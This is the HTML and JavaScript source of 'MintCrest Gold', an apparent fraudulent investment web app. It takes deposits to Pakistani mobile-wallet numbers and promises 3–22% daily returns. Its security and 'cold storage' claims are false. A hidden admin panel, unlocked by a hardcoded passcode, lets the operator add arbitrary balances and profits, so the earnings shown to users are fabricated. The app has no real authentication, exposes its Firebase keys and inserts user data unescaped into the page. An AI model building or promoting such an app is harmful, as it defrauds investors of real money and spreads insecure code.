<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Elite Asset Vault</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000205; color: white; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(40px); border: 1px solid rgba(255,255,255,0.08); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
        .page { display: none; animation: slideUp 0.4s ease-out; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .badge-pending { background: rgba(234, 179, 8, 0.1); color: #eab308; padding: 3px 6px; border-radius: 6px; font-size: 8px; font-weight: 800; text-transform: uppercase; }
        .badge-approved { background: rgba(34, 197, 94, 0.1); color: #4ade80; padding: 3px 6px; border-radius: 6px; font-size: 8px; font-weight: 800; text-transform: uppercase; }
        .badge-rejected { background: rgba(239, 68, 68, 0.1); color: #ef4444; padding: 3px 6px; border-radius: 6px; font-size: 8px; font-weight: 800; text-transform: uppercase; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .animate-marquee { display: inline-block; animation: marquee 15s linear infinite; white-space: nowrap; }
        .gradient-card { background: linear-gradient(135deg, #0f172a 0%, #1e3a8a 100%); }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div id="promo-ticker" class="hidden bg-blue-600/10 border-b border-blue-500/20 py-2.5 overflow-hidden z-[500]">
        <div class="animate-marquee text-[10px] font-black uppercase tracking-[0.2em] text-blue-400">
            🛡️ <span id="ticker-text">MintCrest Gold: Secure Digital Assets Protocol Active.</span>
        </div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#000205] flex items-center justify-center p-8 text-center">
        <div class="w-full max-w-sm">
            <h1 onclick="adminTap()" class="text-6xl font-black italic tracking-tighter mb-1 cursor-pointer uppercase">MINT<span class="text-blue-500">CREST</span></h1>
            <p class="text-gray-500 text-[9px] uppercase tracking-[0.5em] mb-12 font-bold opacity-60">Digital Asset Protocol</p>
            <div class="glass p-10 rounded-[3.5rem] border-t-2 border-blue-600 shadow-2xl">
                <input type="text" id="user-name" placeholder="Establish Username" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-5 focus:border-blue-500 transition-all text-sm">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[11px] uppercase tracking-widest shadow-2xl active:scale-95 transition-all">Secure Entry</button>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        
        <div id="p-home" class="page active-page p-6">
            <div class="gradient-card p-10 rounded-[3rem] mb-6 shadow-2xl relative overflow-hidden">
                <div class="absolute -right-8 -top-8 opacity-10 text-[100px] italic font-black">MCG</div>
                <p class="text-[10px] text-blue-300 font-extrabold mb-1 uppercase tracking-widest opacity-80">Capital Portfolio</p>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                <div id="countdown-display" class="mt-4 text-[9px] font-black text-yellow-400 uppercase italic tracking-widest">Syncing Nodes...</div>
                <div class="mt-8 flex gap-3">
                    <div class="bg-white/5 border border-white/10 px-5 py-2.5 rounded-2xl">
                        <p class="text-[7px] text-gray-400 uppercase font-black">Net Profit</p>
                        <span id="v-profit" class="text-[11px] font-bold text-green-400">₨ 0</span>
                    </div>
                    <div class="bg-white/5 border border-white/10 px-5 py-2.5 rounded-2xl">
                        <p class="text-[7px] text-gray-400 uppercase font-black">Status</p>
                        <span id="tier-tag" class="text-[11px] font-bold text-blue-400 uppercase italic">Inactive</span>
                    </div>
                </div>
            </div>
            
            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] flex flex-col items-center justify-center active:scale-95 transition-all border-b-4 border-blue-600">
                    <span class="text-2xl mb-2">📥</span>
                    <span class="text-[10px] font-black uppercase tracking-widest">Deposit</span>
                </button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] flex flex-col items-center justify-center active:scale-95 transition-all border-b-4 border-red-600">
                    <span class="text-2xl mb-2">📤</span>
                    <span class="text-[10px] font-black uppercase tracking-widest">Withdraw</span>
                </button>
            </div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-center font-black italic mb-8 uppercase text-blue-500 text-xl tracking-tighter">Trading Fleet</h2>
            <div id="plans-list" class="grid grid-cols-1 gap-4 pb-12"></div>
        </div>

        <div id="p-activity" class="page p-6">
            <h2 class="text-center font-black italic mb-8 uppercase text-blue-400 tracking-widest">Security Ledger</h2>
            <div id="user-history" class="space-y-3 pb-12"></div>
        </div>

        <div id="p-more" class="page p-6 space-y-6 pb-12">
            <div class="glass p-8 rounded-[3rem] border-t-4 border-blue-500 text-center relative overflow-hidden">
                <div class="absolute top-0 right-0 p-4 opacity-5 text-4xl italic font-black">REF</div>
                <h3 class="text-blue-500 font-black text-[11px] uppercase mb-4 italic">Referral Protocol</h3>
                <input type="text" id="ref-link" readonly class="w-full bg-white/5 p-4 rounded-2xl text-[10px] text-center font-black mb-4 border border-white/5 outline-none">
                <button onclick="copyRef()" class="bg-blue-600 px-10 py-3 rounded-2xl font-black text-[10px] uppercase tracking-widest active:scale-95">Copy Invite</button>
            </div>

            <div class="glass p-8 rounded-[3rem] border-l-4 border-blue-600">
                <h3 class="text-blue-500 font-black text-[11px] uppercase mb-4 italic flex items-center gap-2">🛡️ Security Protocol</h3>
                <div class="space-y-4 text-[9px] text-gray-400 font-bold uppercase leading-relaxed">
                    <div class="pb-2 border-b border-white/5">
                        <p class="text-blue-300 mb-1">Asset Protection</p>
                        <p class="opacity-60">All deposits are secured via MCG Multi-Sig cold storage encryption.</p>
                    </div>
                    <div class="pb-2 border-b border-white/5">
                        <p class="text-blue-300 mb-1">Verified Payouts</p>
                        <p class="opacity-60">Withdrawals undergo manual validation (ETA: 2-24 Hours).</p>
                    </div>
                    <div>
                        <p class="text-blue-300 mb-1">Anti-Fraud</p>
                        <p class="opacity-60">Single account policy strictly enforced. Anti-fraud monitoring active.</p>
                    </div>
                </div>
            </div>

            <div class="glass p-8 rounded-[3rem] border-t-4 border-yellow-500 text-center">
                <h3 class="text-yellow-500 font-black text-[11px] uppercase mb-4 italic">Reward Center</h3>
                <input type="text" id="promo-input" placeholder="Promo Code..." class="w-full bg-white/5 p-4 rounded-2xl text-[10px] border border-white/10 outline-none mb-4 text-center font-black uppercase">
                <button onclick="applyPromoRequest()" class="w-full bg-yellow-600 py-4 rounded-2xl font-black text-[10px] uppercase shadow-lg active:scale-95">Verify Code</button>
            </div>

            <a href="https://chat.whatsapp.com/EbfTbr66JQLFEmjnxrReE3" class="block glass p-6 rounded-[2.5rem] text-center border-b-4 border-green-500">
                <span class="text-[10px] font-black text-green-400 uppercase tracking-widest">📢 Join Official Group</span>
            </a>

            <button onclick="logout()" class="w-full glass p-6 rounded-[2.5rem] text-center text-[10px] font-black text-red-500 uppercase tracking-widest">Terminate Session</button>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] border-t-8 border-blue-600 shadow-2xl">
                <h3 class="font-black text-blue-500 mb-8 uppercase text-sm text-center italic">Capital Funding</h3>
                <div class="space-y-3 mb-10 text-[10px] font-black">
                    <div class="glass p-5 rounded-2xl flex justify-between bg-blue-500/5"><span>JAZZCASH/SADAPAY</span><span class="text-blue-400">03705519562</span></div>
                    <div class="glass p-5 rounded-2xl flex justify-between bg-green-500/5"><span>EASYPAISA</span><span class="text-green-400">03379827882</span></div>
                </div>
                <input type="number" id="dep-amount" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold outline-none border border-white/10">
                <input type="text" id="dep-trx" placeholder="Transaction ID (TID)" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-bold uppercase outline-none border border-white/10">
                <label class="block w-full bg-white/5 p-6 rounded-2xl mb-8 border border-dashed border-white/20 text-center cursor-pointer active:scale-95">
                    <span id="file-label" class="text-[9px] font-black opacity-40 uppercase italic">📸 Upload Payment Proof</span>
                    <input type="file" id="dep-proof" accept="image/*" class="hidden" onchange="document.getElementById('file-label').innerText = 'Screenshot Ready ✅'">
                </label>
                <button onclick="submitDeposit()" class="w-full bg-blue-600 py-6 rounded-2xl font-black text-[11px] uppercase tracking-widest shadow-xl">Verify Asset Link</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] border-t-8 border-red-600 shadow-2xl">
                <h3 class="font-black text-red-500 mb-8 uppercase text-sm text-center italic">Authorize Payout</h3>
                <input type="number" id="wd-amt" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold outline-none border border-white/10">
                <input type="text" id="wd-acc" placeholder="Account Name & Details" class="w-full bg-white/5 p-5 rounded-2xl mb-8 text-center text-[10px] font-bold outline-none border border-white/10">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-6 rounded-2xl font-black text-[11px] uppercase tracking-widest shadow-xl">Confirm Payout</button>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#000205] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8">
            <h2 class="text-xl font-black text-blue-500 uppercase italic">Master Console 2.0</h2>
            <button onclick="closeAdmin()" class="bg-red-500/10 text-red-500 px-6 py-2 rounded-xl text-[10px] font-black uppercase">Exit</button>
        </div>
        
        <div class="flex gap-2 mb-8 overflow-x-auto pb-2">
            <button onclick="showAdmTab('requests')" class="bg-blue-600 px-6 py-2.5 rounded-xl text-[9px] font-black uppercase whitespace-nowrap">Order Matrix</button>
            <button onclick="showAdmTab('users')" class="glass px-6 py-2.5 rounded-xl text-[9px] font-black uppercase whitespace-nowrap">User Sync</button>
            <button onclick="showAdmTab('broadcast')" class="bg-yellow-600 px-6 py-2.5 rounded-xl text-[9px] font-black uppercase whitespace-nowrap">Broadcast</button>
        </div>

        <div id="adm-sec-requests" class="adm-tab space-y-4"></div>
        <div id="adm-sec-users" class="adm-tab hidden space-y-3"></div>

        <div id="adm-sec-broadcast" class="adm-tab hidden glass p-8 rounded-[3rem]">
            <h3 class="text-yellow-500 font-black text-xs uppercase mb-4 text-center">Protocol Announcement</h3>
            <textarea id="bc-msg" class="w-full bg-white/5 p-4 rounded-2xl text-[10px] border border-white/10 outline-none mb-4 h-24 font-bold"></textarea>
            <button onclick="sendBroadcast()" class="w-full bg-yellow-600 py-3 rounded-xl font-black text-[9px] uppercase">🚀 Update Ticker</button>
        </div>

        <div class="glass p-8 rounded-[3rem] mt-8">
            <h3 class="text-[9px] font-black uppercase mb-4 opacity-30 text-center italic">Asset Injection</h3>
            <input type="text" id="adm-user" placeholder="User Name" class="w-full bg-white/5 p-4 rounded-xl mb-2 text-center text-[10px] font-black border border-white/5">
            <input type="number" id="adm-val" placeholder="Amount" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center text-[10px] font-black border border-white/5">
            <div class="grid grid-cols-2 gap-2">
                <button onclick="manualEdit('balance')" class="bg-blue-600 py-3 rounded-xl font-black text-[9px] uppercase">Add Bal</button>
                <button onclick="manualEdit('profit')" class="bg-green-600 py-3 rounded-xl font-black text-[9px] uppercase">Add Prof</button>
            </div>
        </div>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/5 p-8 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[4rem] shadow-2xl">
        <button onclick="changePage('home')" id="n-home" class="flex flex-col items-center gap-2 active-tab"><span class="text-xl">🏠</span><span class="text-[8px] font-black uppercase">Vault</span></button>
        <button onclick="changePage('invest')" id="n-invest" class="flex flex-col items-center gap-2"><span class="text-xl">📈</span><span class="text-[8px] font-black uppercase">Fleet</span></button>
        <button onclick="changePage('activity')" id="n-activity" class="flex flex-col items-center gap-2"><span class="text-xl">📜</span><span class="text-[8px] font-black uppercase">Ledger</span></button>
        <button onclick="changePage('more')" id="n-more" class="flex flex-col items-center gap-2"><span class="text-xl">🏢</span><span class="text-[8px] font-black uppercase">Firm</span></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;

        const plans = [
            { n: "Micro-Elite I", p: 200, r: 3, d: 30 }, { n: "Micro-Elite II", p: 500, r: 3.2, d: 30 },
            { n: "Bronze-S", p: 1000, r: 3.5, d: 30 }, { n: "Bronze-X", p: 2000, r: 3.8, d: 30 },
            { n: "Silver-S", p: 3000, r: 4.2, d: 30 }, { n: "Silver-X", p: 5000, r: 4.5, d: 30 },
            { n: "Gold-S", p: 7000, r: 5, d: 30 }, { n: "Gold-X", p: 10000, r: 5.5, d: 30 },
            { n: "Gold-Master", p: 15000, r: 6, d: 30 }, { n: "Platinum-S", p: 20000, r: 6.5, d: 30 },
            { n: "Platinum-X", p: 30000, r: 7, d: 30 }, { n: "Diamond-S", p: 40000, r: 7.5, d: 30 },
            { n: "Diamond-X", p: 50000, r: 8, d: 30 }, { n: "Royal-S", p: 75000, r: 9, d: 30 },
            { n: "Royal-Grand", p: 100000, r: 10, d: 30 },
            { n: "⚡ FLASH 24H", p: 500, r: 12, d: 1, s: true },
            { n: "🚀 ROCKET PRO", p: 12000, r: 18, d: 30, s: true },
            { n: "👑 CROWN KING", p: 25000, r: 22, d: 30, s: true }
        ];

        window.onload = () => { 
            const saved = localStorage.getItem('mc_user'); 
            if(saved) { document.getElementById('user-name').value = saved; login(); }
            setInterval(updateCountdown, 1000); 
            listenForPromos();
        };

        function listenForPromos() {
            db.collection("app_data").doc("announcement").onSnapshot(doc => {
                if(doc.exists) {
                    document.getElementById('promo-ticker').classList.remove('hidden');
                    document.getElementById('ticker-text').innerText = doc.data().message;
                }
            });
        }

        async function login() {
            const name = document.getElementById('user-name').value.trim(); if(!name) return;
            localStorage.setItem('mc_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, time: Date.now(), activeTier: 0, tierROI: 0, lastReqTime: Date.now(), tierName: "Inactive" });
            startSync(name); document.getElementById('auth-ui').style.display='none'; document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans(); document.getElementById('ref-link').value = window.location.origin + window.location.pathname + "?ref=" + name;
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { if(doc.exists) { user = doc.data(); document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString(); document.getElementById('tier-tag').innerText = user.tierName; checkProfitReq(user); } });
            db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = snap.empty ? '<p class="text-center opacity-20 py-20 text-[9px] font-black uppercase italic">Ledger Empty</p>' : '';
                let items = []; snap.forEach(doc => items.push(doc.data())); items.sort((a,b) => b.time - a.time);
                items.forEach(d => { 
                    const clr = d.type.includes('dep') ? 'border-blue-500' : (d.type.includes('Profit') ? 'border-green-500' : 'border-red-500'); 
                    list.innerHTML += `<div class="glass p-5 rounded-3xl flex justify-between items-center border-l-4 ${clr} mb-2 text-[10px] font-black uppercase"><div>${d.type}<br><span class="opacity-30 text-[7px] font-bold">${new Date(d.time).toLocaleString()}</span></div><div class="text-right">₨ ${d.amount}<br><span class="badge-${d.status}">${d.status}</span></div></div>`; 
                });
            });
        }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => {
                const style = p.s ? 'background: linear-gradient(135deg, rgba(59,130,246,0.1), rgba(147,51,234,0.1)); border: 1px solid rgba(59,130,246,0.3) !important;' : '';
                const totalProfit = ((p.p * p.r / 100) * p.d).toLocaleString();
                list.innerHTML += `<div onclick="buy(${p.p}, ${p.r}, '${p.n}')" class="glass p-5 rounded-[2.5rem] flex justify-between items-center active:scale-95 cursor-pointer mb-2" style="${style}"><div><h4 class="font-black text-[11px] uppercase ${p.s ? 'text-blue-400' : 'text-gray-400'}">${p.n}</h4><p class="text-[8px] text-green-400 font-bold uppercase">${p.r}% Yield/Day</p><p class="text-[7px] text-gray-500 font-bold uppercase italic mt-1">⏳ ${p.d} Days Contract</p></div><div class="text-right"><p class="font-black text-[13px]">₨ ${p.p.toLocaleString()}</p><p class="text-[6px] opacity-40 font-black uppercase italic">Total: ₨ ${totalProfit}</p></div></div>`;
            });
        }

        async function submitDeposit() {
            const a = document.getElementById('dep-amount').value; const t = document.getElementById('dep-trx').value; const f = document.getElementById('dep-proof');
            if(!a || !t || !f.files[0]) return alert("Missing Evidence!");
            const r = new FileReader(); r.readAsDataURL(f.files[0]); r.onload = async () => {
                await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, proof: r.result, type: "deposit", status: "pending", time: Date.now() });
                alert("Evidence Logged, Sweetie!"); changePage('activity');
            };
        }

        async function submitWithdraw() {
            const a = document.getElementById('wd-amt').value; const acc = document.getElementById('wd-acc').value; if(!a || !acc || parseInt(a) > user.balance) return alert("Invalid Authorization!");
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), acc: acc, type: "withdraw", status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ balance: user.balance - parseInt(a) }); alert("Requested!"); changePage('activity');
        }

        async function applyPromoRequest() {
            const code = document.getElementById('promo-input').value.trim(); if(!code) return;
            await db.collection("requests").add({ user: user.name, amount: 0, type: "Promo Request: "+code, status: "pending", time: Date.now() });
            alert("Promo Sent!"); changePage('activity');
        }

        async function buy(p, roi, tName) {
            if(user.balance < p) return alert("Insufficient Balance!");
            if(confirm("Establish Link with "+tName+"?")) { 
                await db.collection("users").doc(user.name).update({ balance: user.balance - p, activeTier: p, tierROI: roi, tierName: tName, lastReqTime: Date.now() }); 
                alert("Protocol Established!"); changePage('activity');
            }
        }

        async function checkProfitReq(u) { if (u.activeTier > 0 && (Date.now() - u.lastReqTime) >= 86400000) { const amt = (u.activeTier * u.tierROI) / 100; await db.collection("requests").add({ user: u.name, amount: amt, type: "Daily Profit Yield", status: "pending", time: Date.now() }); await db.collection("users").doc(u.name).update({ lastReqTime: Date.now() }); } }
        function updateCountdown() { if (user && user.activeTier > 0) { const d = (user.lastReqTime + 86400000) - Date.now(); if(d>0) { const h = Math.floor(d/3600000); const m = Math.floor((d%3600000)/60000); const s = Math.floor((d%60000)/1000); document.getElementById('countdown-display').innerText = `NEXT YIELD: ${h}H ${m}M ${s}S`; } else { document.getElementById('countdown-display').innerText = "YIELD READY"; } } else { document.getElementById('countdown-display').innerText = "SYSTEM IDLE"; } }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); if(p!=='wallet'&&p!=='withdraw') document.getElementById('n-'+p).classList.add('active-tab'); }
        function logout() { localStorage.removeItem('mc_user'); location.reload(); }
        function adminTap() { tapCount++; if(tapCount >= 5) { if(prompt("Passcode:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } setTimeout(()=>tapCount=0,3000); }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function showAdmTab(t) { document.querySelectorAll('.adm-tab').forEach(s=>s.classList.add('hidden')); document.getElementById('adm-sec-'+t).classList.remove('hidden'); }
        function copyRef() { const c = document.getElementById('ref-link'); c.select(); document.execCommand('copy'); alert("Link Copied!"); }

        async function sendBroadcast() { const m = document.getElementById('bc-msg').value; await db.collection("app_data").doc("announcement").set({ message: m }); alert("News Updated."); }

        async function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-sec-requests'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); 
                    const pBtn = d.proof ? `<button onclick="window.open().document.write('<img src=\\'${d.proof}\\' style=\\'width:100%\\' />')" class="bg-blue-400 px-2 py-1 rounded">📸</button>` : '';
                    list.innerHTML += `<div class="glass p-4 rounded-xl flex justify-between items-center text-[9px] font-black uppercase"><div>${d.user}<br>₨ ${d.amount} (${d.type})</div><div class="flex gap-2">${pBtn}<button onclick="handle('${doc.id}','${d.user}',${d.amount},'approved','${d.type}')" class="bg-green-600 px-2 py-1 rounded">YES</button></div></div>`;
                });
            });
            db.collection("users").onSnapshot(snap => { const list = document.getElementById('adm-sec-users'); list.innerHTML = ''; snap.forEach(doc => { const u = doc.data(); list.innerHTML += `<div class="glass p-4 rounded-xl flex justify-between items-center text-[9px] font-black uppercase"><div>${u.name}</div><div>₨ ${u.balance}</div><button onclick="deleteUser('${u.name}')" class="text-red-500 font-bold italic">❌</button></div>`; }); });
        }

        async function handle(id, u, amt, act, type) { 
            const ref = db.collection("users").doc(u); const doc = await ref.get(); 
            let finalAmt = amt;
            if(act==='approved') {
                if(type.includes('Promo Request')) { finalAmt = parseInt(prompt("Enter Bonus:")); if(!finalAmt) return; }
                if(type==='deposit' || type.includes('Profit') || type.includes('Promo')) { await ref.update({ balance: (doc.data().balance||0) + finalAmt }); }
            } else if(act==='rejected' && type==='withdraw') { await ref.update({ balance: (doc.data().balance||0) + amt }); }
            await db.collection("requests").doc(id).update({ status: act, amount: finalAmt }); 
        }

        async function manualEdit(f) { const u = document.getElementById('adm-user').value; const v = parseInt(document.getElementById('adm-val').value); const ref = db.collection("users").doc(u); const d = await ref.get(); if(d.exists) await ref.update({ [f]: (d.data()[f]||0)+v }); alert("Funds Injected!"); }
        async function deleteUser(n) { if(confirm("Delete user "+n+"?")) await db.collection("users").doc(n).delete(); }
    </script>
</body>
</html>
